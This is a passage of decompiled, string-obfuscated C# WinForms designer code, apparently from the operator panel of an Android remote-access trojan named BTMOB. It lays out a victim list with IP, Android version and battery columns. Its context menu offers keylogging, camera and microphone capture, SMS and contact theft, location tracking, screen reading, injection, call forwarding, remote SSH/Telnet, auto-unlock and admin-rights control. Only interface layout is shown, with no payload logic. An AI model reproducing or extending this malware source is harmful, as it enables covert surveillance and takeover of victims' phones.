		dataGridViewCellStyle5.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 10f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.Padding = new System.Windows.Forms.Padding(3);
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(60, 60, 60);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.RowTemplate.Height = 20;
		this.DGV0.RowTemplate.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.ShowEditingIcon = false;
		this.DGV0.Size = new System.Drawing.Size(982, 724);
		this.DGV0.TabIndex = 3;
		this.walpclu.FillWeight = 17.5283f;
		this.walpclu.HeaderText = EXGuarder._560A505F;
		this.walpclu.MinimumWidth = 6;
		this.walpclu.Name = EXGuarder._392E2C6B;
		this.walpclu.ReadOnly = true;
		this.flgcliclu.FillWeight = 15.65837f;
		this.flgcliclu.HeaderText = EXGuarder._0B2C6B23;
		this.flgcliclu.MinimumWidth = 6;
		this.flgcliclu.Name = EXGuarder._5F653A27;
		this.flgcliclu.ReadOnly = true;
		this.scrcliclu.FillWeight = 19.12178f;
		this.scrcliclu.HeaderText = EXGuarder._575F4225;
		this.scrcliclu.MinimumWidth = 6;
		this.scrcliclu.Name = EXGuarder._2C5F1E58;
		this.scrcliclu.ReadOnly = true;
		this.clintnameclu.FillWeight = 35.05661f;
		this.clintnameclu.HeaderText = EXGuarder._494C0F2C;
		this.clintnameclu.MinimumWidth = 6;
		this.clintnameclu.Name = EXGuarder._05734A40;
		this.clintnameclu.ReadOnly = true;
		this.ipclinclu.FillWeight = 39.83705f;
		this.ipclinclu.HeaderText = EXGuarder._7517115B;
		this.ipclinclu.MinimumWidth = 6;
		this.ipclinclu.Name = EXGuarder._40713A3C;
		this.ipclinclu.ReadOnly = true;
		this.andoverclu.FillWeight = 25.49572f;
		this.andoverclu.HeaderText = EXGuarder._2D020F68;
		this.andoverclu.MinimumWidth = 6;
		this.andoverclu.Name = EXGuarder._6A51173F;
		this.andoverclu.ReadOnly = true;
		this.trakingclu.FillWeight = 39.83705f;
		this.trakingclu.HeaderText = EXGuarder._02163E36;
		this.trakingclu.MinimumWidth = 6;
		this.trakingclu.Name = EXGuarder._3F551D72;
		this.trakingclu.ReadOnly = true;
		this.instdatclu.FillWeight = 31.86965f;
		this.instdatclu.HeaderText = EXGuarder._0E6A693D;
		this.instdatclu.MinimumWidth = 6;
		this.instdatclu.Name = EXGuarder._29390807;
		this.instdatclu.ReadOnly = true;
		this.verclu.FillWeight = 15.93482f;
		this.verclu.HeaderText = EXGuarder._39252E45;
		this.verclu.MinimumWidth = 6;
		this.verclu.Name = EXGuarder._5D036F3F;
		this.verclu.ReadOnly = true;
		this.conicoclu.FillWeight = 19.12178f;
		this.conicoclu.HeaderText = EXGuarder._65601466;
		this.conicoclu.MinimumWidth = 6;
		this.conicoclu.Name = EXGuarder._27271977;
		this.conicoclu.ReadOnly = true;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleRight;
		dataGridViewCellStyle6.NullValue = null;
		this.btryclu.DefaultCellStyle = dataGridViewCellStyle6;
		this.btryclu.FillWeight = 19.12178f;
		this.btryclu.HeaderText = EXGuarder._5422416D;
		this.btryclu.MinimumWidth = 6;
		this.btryclu.Name = EXGuarder._544B1B1C;
		this.btryclu.ReadOnly = true;
		this.actvclu.FillWeight = 28.68268f;
		this.actvclu.HeaderText = EXGuarder._0A46386F;
		this.actvclu.MinimumWidth = 6;
		this.actvclu.Name = EXGuarder._5A380260;
		this.actvclu.ReadOnly = true;
		this.jctcolmn.FillWeight = 17.5283f;
		this.jctcolmn.HeaderText = EXGuarder._1040291F;
		this.jctcolmn.MinimumWidth = 6;
		this.jctcolmn.Name = EXGuarder._243E5D4E;
		this.jctcolmn.ReadOnly = true;
		this.pngtxtclu.FillWeight = 15.93482f;
		this.pngtxtclu.HeaderText = EXGuarder._67713640;
		this.pngtxtclu.MinimumWidth = 6;
		this.pngtxtclu.Name = EXGuarder._2A745F2E;
		this.pngtxtclu.ReadOnly = true;
		this.favclmn.FillWeight = 14.31797f;
		this.favclmn.HeaderText = EXGuarder._2E2F7511;
		this.favclmn.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.favclmn.MinimumWidth = 6;
		this.favclmn.Name = EXGuarder._51721E56;
		this.favclmn.ReadOnly = true;
		this.cryptclmon.FillWeight = 18f;
		this.cryptclmon.HeaderText = EXGuarder._4C62240C;
		this.cryptclmon.MinimumWidth = 6;
		this.cryptclmon.Name = EXGuarder._5174754F;
		this.cryptclmon.ReadOnly = true;
		this.ctx_clients.BackColor = System.Drawing.Color.FromArgb(207, 216, 220);
		this.ctx_clients.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.ctx_clients.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctx_clients.Items.AddRange(new System.Windows.Forms.ToolStripItem[23]
		{
			this.ToolStrip_manage, this.ToolStrip_files, this.ToolStrip_scr, this.ToolStrip_cam, this.ToolStrip_mic, this.ToolStrip_msgs, this.ToolStrip_contct, this.ToolStrip_apps, this.ToolStrip_keylog, this.ToolStrip_location,
			this.ToolStrip_brows, this.ToolStrip_tools, this.ToolStrip_trak, this.ToolStrip_chat, this.ToolStrip_clipb, this.ToolStrip_blocker, this.ToolStrip_lockscr, this.ToolStrip_scrred, this.ToolStrip_ject, this.ToolStrip_edits,
			this.ToolStrip_conct, this.ToolStripSeparator1, this.ToolStrip_clifolder
		});
		this.ctx_clients.Name = EXGuarder._21607748;
		this.ctx_clients.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
		this.ctx_clients.Size = new System.Drawing.Size(209, 649);
		this.ctx_clients.Style = DrakeUI.Framework.UIStyle.Black;
		this.ctx_clients.StyleCustomMode = true;
		this.ToolStrip_manage.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_manage.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_manage.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._53055B73);
		this.ToolStrip_manage.Name = EXGuarder._1C061B2F;
		this.ToolStrip_manage.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_manage.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_manage.Text = EXGuarder._21345236;
		this.ToolStrip_files.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_files.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_files.Image = BTMOB.My.Resources.Resources.filesmanage;
		this.ToolStrip_files.Name = EXGuarder._5F1A4C3B;
		this.ToolStrip_files.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_files.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_files.Text = EXGuarder._542A0B3F;
		this.ToolStrip_scr.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_scr.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_scr.Image = BTMOB.My.Resources.Resources.screen;
		this.ToolStrip_scr.Name = EXGuarder._5A20205E;
		this.ToolStrip_scr.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_scr.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_scr.Text = EXGuarder._575F4225;
		this.ToolStrip_cam.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_cam.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_cam.Image = BTMOB.My.Resources.Resources.camera;
		this.ToolStrip_cam.Name = EXGuarder._53121B4F;
		this.ToolStrip_cam.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_cam.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_cam.Text = EXGuarder._78013F4D;
		this.ToolStrip_mic.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_mic.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_mic.Image = BTMOB.My.Resources.Resources.microphone;
		this.ToolStrip_mic.Name = EXGuarder._780D3225;
		this.ToolStrip_mic.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_mic.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_mic.Text = EXGuarder._5727722A;
		this.ToolStrip_msgs.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_msgs.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_msgs.Image = BTMOB.My.Resources.Resources.sms;
		this.ToolStrip_msgs.Name = EXGuarder._3A07303D;
		this.ToolStrip_msgs.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_msgs.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_msgs.Text = EXGuarder._611C1656;
		this.ToolStrip_contct.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_contct.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_contct.Image = BTMOB.My.Resources.Resources.contacts;
		this.ToolStrip_contct.Name = EXGuarder._031F6771;
		this.ToolStrip_contct.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_contct.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_contct.Text = EXGuarder._6647322E;
		this.ToolStrip_apps.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_apps.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_apps.Image = BTMOB.My.Resources.Resources.apps;
		this.ToolStrip_apps.Name = EXGuarder._175D483A;
		this.ToolStrip_apps.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_apps.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_apps.Text = EXGuarder._36252525;
		this.ToolStrip_keylog.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_keylog.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_keylog.Image = BTMOB.My.Resources.Resources.keyboard;
		this.ToolStrip_keylog.Name = EXGuarder._71314814;
		this.ToolStrip_keylog.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_keylog.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_keylog.Text = EXGuarder._00506A41;
		this.ToolStrip_location.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_location.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_location.Image = BTMOB.My.Resources.Resources.location;
		this.ToolStrip_location.Name = EXGuarder._00324579;
		this.ToolStrip_location.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_location.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_location.Text = EXGuarder._3C6C6469;
		this.ToolStrip_brows.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_brows.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_brows.Image = BTMOB.My.Resources.Resources.browser;
		this.ToolStrip_brows.Name = EXGuarder._6C136051;
		this.ToolStrip_brows.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_brows.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_brows.Text = EXGuarder._52662846;
		this.ToolStrip_tools.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_tools.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.ToastToolStripMenuItem, this.ToolStripMenuItem1, this.OpenLinkToolStripMenuItem, this.CallPhoneToolStripMenuItem, this.VibrateToolStripMenuItem, this.TerminalToolStripMenuItem, this.CallForwardingToolStripMenuItem, this.RemoteSSHToolStripMenuItem, this.autounlktoolstrip, this.admintoolstrip,
			this.RemoteTelnetToolStripMenuItem
		});
		this.ToolStrip_tools.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_tools.Image = BTMOB.My.Resources.Resources.tools;
		this.ToolStrip_tools.Name = EXGuarder._2E5C650C;
		this.ToolStrip_tools.Size = new System.Drawing.Size(208, 26);
		this.ToolStrip_tools.Text = EXGuarder._004F066C;
		this.ToastToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToastToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ToastToolStripMenuItem.Image = BTMOB.My.Resources.Resources.toast;
		this.ToastToolStripMenuItem.Name = EXGuarder._49733E6F;
		this.ToastToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.ToastToolStripMenuItem.Text = EXGuarder._10322709;
		this.ToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStripMenuItem1.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem1.Image = BTMOB.My.Resources.Resources.texttispeech;
		this.ToolStripMenuItem1.Name = EXGuarder._04440569;
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(242, 26);
		this.ToolStripMenuItem1.Text = EXGuarder._6247670A;
		this.OpenLinkToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.OpenLinkToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.OpenLinkToolStripMenuItem.Image = BTMOB.My.Resources.Resources.redirect1;
		this.OpenLinkToolStripMenuItem.Name = EXGuarder._18714A5D;
		this.OpenLinkToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.OpenLinkToolStripMenuItem.Text = EXGuarder._4A4D0567;
		this.CallPhoneToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.CallPhoneToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.CallPhoneToolStripMenuItem.Image = BTMOB.My.Resources.Resources.callphone;
		this.CallPhoneToolStripMenuItem.Name = EXGuarder._33191A51;
		this.CallPhoneToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.CallPhoneToolStripMenuItem.Text = EXGuarder._323D154F;
		this.VibrateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.VibrateToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.VibrateToolStripMenuItem.Image = BTMOB.My.Resources.Resources.vibratmobe;
		this.VibrateToolStripMenuItem.Name = EXGuarder._400D246D;
		this.VibrateToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.VibrateToolStripMenuItem.Text = EXGuarder._572D7533;
		this.TerminalToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.TerminalToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.TerminalToolStripMenuItem.Image = BTMOB.My.Resources.Resources.terminalc;
		this.TerminalToolStripMenuItem.Name = EXGuarder._1A5D3A35;
		this.TerminalToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.TerminalToolStripMenuItem.Text = EXGuarder._121A5D04;
		this.CallForwardingToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.CallForwardingToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.CallForwardingToolStripMenuItem.Image = BTMOB.My.Resources.Resources.callforword;
		this.CallForwardingToolStripMenuItem.Name = EXGuarder._001C0876;
		this.CallForwardingToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.CallForwardingToolStripMenuItem.Text = EXGuarder._00742B35;
		this.RemoteSSHToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.RemoteSSHToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RemoteSSHToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._6D2E1F21);
		this.RemoteSSHToolStripMenuItem.Name = EXGuarder._5C1D5906;
		this.RemoteSSHToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.RemoteSSHToolStripMenuItem.Text = EXGuarder._46571F19;
		this.autounlktoolstrip.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.autounlktoolstrip.ForeColor = System.Drawing.Color.White;
		this.autounlktoolstrip.Image = BTMOB.My.Resources.Resources.unlockico;
		this.autounlktoolstrip.Name = EXGuarder._602D1E50;
		this.autounlktoolstrip.Size = new System.Drawing.Size(242, 26);
		this.autounlktoolstrip.Text = EXGuarder._69005824;
		this.admintoolstrip.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.admintoolstrip.ForeColor = System.Drawing.Color.White;
		this.admintoolstrip.Image = BTMOB.My.Resources.Resources.adminright;
		this.admintoolstrip.Name = EXGuarder._696E0E6E;
		this.admintoolstrip.Size = new System.Drawing.Size(242, 26);
		this.admintoolstrip.Text = EXGuarder._72532510;
		this.RemoteTelnetToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.RemoteTelnetToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RemoteTelnetToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._71780716);
		this.RemoteTelnetToolStripMenuItem.Name = EXGuarder._61084647;
		this.RemoteTelnetToolStripMenuItem.Size = new System.Drawing.Size(242, 26);
		this.RemoteTelnetToolStripMenuItem.Text = EXGuarder._1D542506;
		this.ToolStrip_trak.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_trak.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_trak.Image = BTMOB.My.Resources.Resources.track1;
		this.ToolStrip_trak.Name = EXGuarder._36123C00;
		this.ToolStrip_trak.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_trak.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_trak.Text = EXGuarder._02163E36;
		this.ToolStrip_chat.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_chat.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_chat.Image = BTMOB.My.Resources.Resources.chat;
		this.ToolStrip_chat.Name = EXGuarder._1A136962;
		this.ToolStrip_chat.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_chat.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_chat.Text = EXGuarder._3054224A;
		this.ToolStrip_clipb.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_clipb.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_clipb.Image = (System.Drawing.Image)resources.GetObject(EXGuarder._4D540431);
		this.ToolStrip_clipb.Name = EXGuarder._1D100162;
		this.ToolStrip_clipb.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_clipb.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_clipb.Text = EXGuarder._022D1E1D;
		this.ToolStrip_blocker.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_blocker.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_blocker.Image = BTMOB.My.Resources.Resources.blocker1;
		this.ToolStrip_blocker.Name = EXGuarder._0E151722;
		this.ToolStrip_blocker.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_blocker.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_blocker.Text = EXGuarder._683D0011;
		this.ToolStrip_lockscr.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_lockscr.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_lockscr.Image = BTMOB.My.Resources.Resources.lock1;
		this.ToolStrip_lockscr.Name = EXGuarder._23590F52;
		this.ToolStrip_lockscr.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_lockscr.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_lockscr.Text = EXGuarder._09766B6A;
		this.ToolStrip_scrred.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_scrred.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_scrred.Image = BTMOB.My.Resources.Resources.screnrader;
		this.ToolStrip_scrred.Name = EXGuarder._59696A14;
		this.ToolStrip_scrred.Size = new System.Drawing.Size(208, 26);
		this.ToolStrip_scrred.Text = EXGuarder._47112356;
		this.ToolStrip_ject.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_ject.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_ject.Image = BTMOB.My.Resources.Resources.sring;
		this.ToolStrip_ject.Name = EXGuarder._2C515917;
		this.ToolStrip_ject.Size = new System.Drawing.Size(208, 26);
		this.ToolStrip_ject.Text = EXGuarder._4F3A2723;
		this.ToolStrip_edits.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_edits.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.NotesToolStripMenuItem, this.RenameToolStripMenuItem, this.RedirectToolStripMenuItem });
		this.ToolStrip_edits.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_edits.Image = BTMOB.My.Resources.Resources.editclint;
		this.ToolStrip_edits.Name = EXGuarder._0F28483C;
		this.ToolStrip_edits.Size = new System.Drawing.Size(208, 26);
		this.ToolStrip_edits.Text = EXGuarder._205A386F;
		this.NotesToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.NotesToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.NotesToolStripMenuItem.Image = BTMOB.My.Resources.Resources.notes;
		this.NotesToolStripMenuItem.Name = EXGuarder._4F2D265F;
		this.NotesToolStripMenuItem.Size = new System.Drawing.Size(154, 26);
		this.NotesToolStripMenuItem.Text = EXGuarder._3B080E17;
		this.RenameToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.RenameToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RenameToolStripMenuItem.Image = BTMOB.My.Resources.Resources.idcard;
		this.RenameToolStripMenuItem.Name = EXGuarder._11364123;
		this.RenameToolStripMenuItem.Size = new System.Drawing.Size(154, 26);
		this.RenameToolStripMenuItem.Text = EXGuarder._28053A72;
		this.RedirectToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.RedirectToolStripMenuItem.Enabled = false;
		this.RedirectToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RedirectToolStripMenuItem.Image = BTMOB.My.Resources.Resources.sendto;
		this.RedirectToolStripMenuItem.Name = EXGuarder._16724D48;
		this.RedirectToolStripMenuItem.Size = new System.Drawing.Size(154, 26);
		this.RedirectToolStripMenuItem.Text = EXGuarder._35692800;
		this.RedirectToolStripMenuItem.Visible = false;
		this.ToolStrip_conct.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_conct.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.ToolStripMenuItem12, this.ToolStripMenuItem13, this.ToolStripMenuItem16, this.BlockToolStripMenuItem });
		this.ToolStrip_conct.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_conct.Image = BTMOB.My.Resources.Resources.connections;
		this.ToolStrip_conct.Name = EXGuarder._571A0B25;
		this.ToolStrip_conct.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_conct.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_conct.Text = EXGuarder._65601466;
		this.ToolStripMenuItem12.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem12.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem12.Image = BTMOB.My.Resources.Resources.block;
		this.ToolStripMenuItem12.Name = EXGuarder._01442A22;
		this.ToolStripMenuItem12.Size = new System.Drawing.Size(170, 26);
		this.ToolStripMenuItem12.Text = EXGuarder._29496766;
		this.ToolStripMenuItem13.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem13.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem13.Image = BTMOB.My.Resources.Resources.restart;
		this.ToolStripMenuItem13.Name = EXGuarder._771C633F;
		this.ToolStripMenuItem13.Size = new System.Drawing.Size(170, 26);
		this.ToolStripMenuItem13.Text = EXGuarder._5B6D2C3B;
		this.ToolStripMenuItem16.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripMenuItem16.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem16.Image = BTMOB.My.Resources.Resources.exs;
		this.ToolStripMenuItem16.Name = EXGuarder._5D097244;
		this.ToolStripMenuItem16.Size = new System.Drawing.Size(170, 26);
		this.ToolStripMenuItem16.Text = EXGuarder._0B62432F;
		this.BlockToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BlockToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.BlockToolStripMenuItem.Image = BTMOB.My.Resources.Resources.uninstall;
		this.BlockToolStripMenuItem.Name = EXGuarder._53214B79;
		this.BlockToolStripMenuItem.Size = new System.Drawing.Size(170, 26);
		this.BlockToolStripMenuItem.Text = EXGuarder._64402248;
		this.ToolStripSeparator1.AutoSize = false;
		this.ToolStripSeparator1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ToolStripSeparator1.Name = EXGuarder._534D1F19;
		this.ToolStripSeparator1.Size = new System.Drawing.Size(205, 1);
		this.ToolStrip_clifolder.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStrip_clifolder.ForeColor = System.Drawing.Color.White;
		this.ToolStrip_clifolder.Name = EXGuarder._67272C31;
		this.ToolStrip_clifolder.Padding = new System.Windows.Forms.Padding(3);
		this.ToolStrip_clifolder.Size = new System.Drawing.Size(214, 30);
		this.ToolStrip_clifolder.Text = EXGuarder._492F7576;
		this.DashboardPanel.Controls.Add(this.panel_DGV0);
		this.DashboardPanel.Controls.Add(this.homepanel);
		this.DashboardPanel.Controls.Add(this.Panel_updates);
		this.DashboardPanel.Controls.Add(this.panel_list_block);
		this.DashboardPanel.Controls.Add(this.panel_CONLIST);
		this.DashboardPanel.Controls.Add(this.panel_notifys);
		this.DashboardPanel.Controls.Add(this.Panel_screens);
		this.DashboardPanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DashboardPanel.Location = new System.Drawing.Point(0, 20);
		this.DashboardPanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DashboardPanel.Name = EXGuarder._4A205724;
		this.DashboardPanel.Size = new System.Drawing.Size(1450, 808);
		this.DashboardPanel.TabIndex = 5;
		this.panel_DGV0.AutoSize = true;
		this.panel_DGV0.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.panel_DGV0.Controls.Add(this.DGV0);
		this.panel_DGV0.Controls.Add(this.DrakeWidth_W16);
		this.panel_DGV0.Controls.Add(this.DrakeUIScrollBar1);
		this.panel_DGV0.Controls.Add(this.barview);
		this.panel_DGV0.Controls.Add(this.ClitopView);
		this.panel_DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel_DGV0.Location = new System.Drawing.Point(0, 0);
		this.panel_DGV0.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel_DGV0.Name = EXGuarder._0E393767;
		this.panel_DGV0.Size = new System.Drawing.Size(1450, 808);
		this.panel_DGV0.TabIndex = 5;
		this.DrakeWidth_W16.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W16.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W16.Location = new System.Drawing.Point(982, 84);
		this.DrakeWidth_W16.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W16.Name = EXGuarder._683C4E50;
		this.DrakeWidth_W16.Size = new System.Drawing.Size(3, 724);
		this.DrakeWidth_W16.TabIndex = 42;
		this.DrakeUIScrollBar1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIScrollBar1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIScrollBar1.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIScrollBar1.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.DrakeUIScrollBar1.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIScrollBar1.HoverColor = System.Drawing.Color.White;
		this.DrakeUIScrollBar1.Location = new System.Drawing.Point(985, 84);
		this.DrakeUIScrollBar1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeUIScrollBar1.Name = EXGuarder._31196276;
		this.DrakeUIScrollBar1.Padding = new System.Windows.Forms.Padding(3);
		this.DrakeUIScrollBar1.PressColor = System.Drawing.Color.DarkCyan;
		this.DrakeUIScrollBar1.Size = new System.Drawing.Size(15, 724);
		this.DrakeUIScrollBar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIScrollBar1.TabIndex = 41;
		this.DrakeUIScrollBar1.Text = EXGuarder._31196276;
		this.barview.AllowExternalDrop = true;
		this.barview.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.barview.CreationProperties = null;
		this.barview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.barview.Dock = System.Windows.Forms.DockStyle.Right;
		this.barview.ForeColor = System.Drawing.Color.White;
		this.barview.Location = new System.Drawing.Point(1000, 84);
		this.barview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.barview.Name = EXGuarder._4F22715F;
		this.barview.Size = new System.Drawing.Size(450, 724);
		this.barview.TabIndex = 43;
		this.barview.ZoomFactor = 1.0;
		this.ClitopView.AllowExternalDrop = true;
		this.ClitopView.CreationProperties = null;
		this.ClitopView.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
